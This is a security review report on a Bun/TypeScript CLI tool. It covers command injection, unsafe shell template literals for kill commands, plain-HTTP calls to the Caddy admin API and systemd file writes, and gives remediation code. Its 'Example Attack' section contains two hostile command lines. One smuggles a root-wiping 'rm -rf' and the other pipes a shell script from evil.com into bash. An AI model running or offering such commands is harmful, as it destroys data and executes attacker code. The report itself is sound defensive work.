# Security Review Report

## Domain 4: Attack Surface & Local Execution

<!--
| Finding | Severity | Affected Code/File | Remediation Strategy |
|---------|----------|-------------------|---------------------|
| Config file handling | Low | `src/utils/paths.ts`, `src/utils/config.ts` | Consider encrypting sensitive config sections; validate file permissions on read/write |
| Infisical credential exposure | Medium | `kiset.config.ts:8-12` | Implement secure logging filters; never log Infisical secrets or tokens |
| **Unsafe force-unlock** | Low | `src/utils/lockfile.ts:57-77` | Identify and warn if lock file is held by running process; confirm user intent |
| **Config path traversal** | Low | `src/utils/config.ts:77` | Validate config path doesn't contain `..`, symlinks, or escape intended directory |

| **HTTP-only Caddy Admin API** | **High** | `src/utils/caddy.ts:29-30` | Enable TLS for Caddy admin endpoint; use Unix socket for localhost communication |
| Unencrypted admin port | Medium | `src/constants.ts:30` | Configure Caddy to use HTTPS on admin port (2020) |
| No certificate pinning | Medium | `src/utils/caddy.ts:30` | Implement certificate pinning for Caddy admin API |

| No lockfile integrity check | Low | `.github/workflows/ci.yml:37` | Add lockfile integrity verification before `bun install` |
| **Shell template injection** | **High** | `src/sdk/service.start.ts:90`<br>`src/utils/utils.ts:53,178`<br>`src/utils/utils.ts:45` | Replace `$\`` template literals with`Bun.spawn()` using array arguments; validate all interpolated values |
-->

1. **Input Validation Framework** - Centralized validation for all user inputs
2. **Config Path Validation** - Prevent path traversal in config loading
3. **Logging Security** - Implement secure logging for sensitive operations

---

## Detailed Analysis

### Critical Vulnerability: Command Injection (run.ts)

**Location:** `src/sdk/run.ts:85-90`

```typescript
const subprocess = Bun.spawn([command, ...args], {
  env: { ...process.env, ...env },
  stderr: "inherit",
  stdin: "inherit",
  stdout: "inherit"
})
```

**Risk:** The `command` and `args` are taken directly from user CLI input without validation. An attacker could execute arbitrary commands.

**Example Attack:**

```bash
kiset run "; rm -rf / --no-preserve-root" "" ""
kiset run "curl http://evil.com/shell.sh | bash" "" ""
```

**Remediation:**

1. Implement a command allowlist
2. Validate command exists in PATH before spawning
3. Sanitize args to prevent shell metacharacters
4. Consider using a sandbox/chroot for command execution

---

### High Severity: Shell Template Injection

**Location:** Multiple files using `Bun.$\` `

**Affected Code:**

- `src/sdk/service.start.ts:90` - `$\`kill ${pid}\``
- `src/utils/utils.ts:45` - `$\`kill -0 ${pid}\``
- `src/utils/utils.ts:53` - `$\`kill ${pid}\``
- `src/utils/utils.ts:178` - `$\`kill ${pid}\``

**Risk:** While PIDs are internally generated, the pattern of using template literals for shell commands is dangerous and could lead to injection if the code changes or if PID values are ever derived from external sources.

**Remediation:**
Replace all shell template literals with `Bun.spawn()`:

```typescript
// ❌ Unsafe
await $`kill ${pid}`

// ✅ Safe
Bun.spawn(["kill", pid.toString()], { stdout: "pipe", stderr: "pipe" }).exited
```

---

### High Severity: Insecure Admin API Communication

**Location:** `src/utils/caddy.ts:29-30`

```typescript
const CADDY_ADMIN_API = `http://${hostname}:${port}`
const response = await fetch(`${CADDY_ADMIN_API}${endpoint}`, { ... })
```

**Risk:** Caddy admin API communicates over HTTP on localhost. If an attacker can compromise the local network or has local access, they could intercept, modify, or replay admin API requests to:

- Read/modify Caddy configuration
- Add/remove reverse proxy routes
- Access sensitive certificate data

**Remediation:**

1. Configure Caddy with HTTPS for admin endpoint
2. Use Unix socket for local admin communication
3. Implement mutual TLS authentication
4. Add API request signing/hmac verification

---

### Medium Severity: Arbitrary Systemd File Creation

**Location:** `src/sdk/autostart.ts:35`

```typescript
write(PATHS.AUTOSTART_SERVICE_PATH, content)
```

**Risk:** The `user` and `cwd` variables are used directly in the systemd service file without validation, potentially allowing path traversal or privilege escalation.

**Remediation:**

```typescript
const sanitizedUser = sanitizeSystemdUser(user)
const sanitizedCwd = validateAbsolutePath(cwd)
```

---

## Recommended Security Enhancements

### 1. Input Validation Framework

Create a centralized validation module:

```typescript
// src/utils/validation.ts
export function validatePid(pid: number): void {
  if (!Number.isInteger(pid) || pid < 1 || pid > 4194304) {
    throw new Error(`Invalid PID: ${pid}`)
  }
}

export function sanitizePath(path: string): string {
  if (path.includes('..') || path.startsWith('/') || path.includes('\0')) {
    throw new Error('Invalid path detected')
  }
  return path
}
```

**Key Recommendations:**

1. Implement centralized input validation
2. Replace all shell template literals with spawn
3. Enable TLS for admin API communication
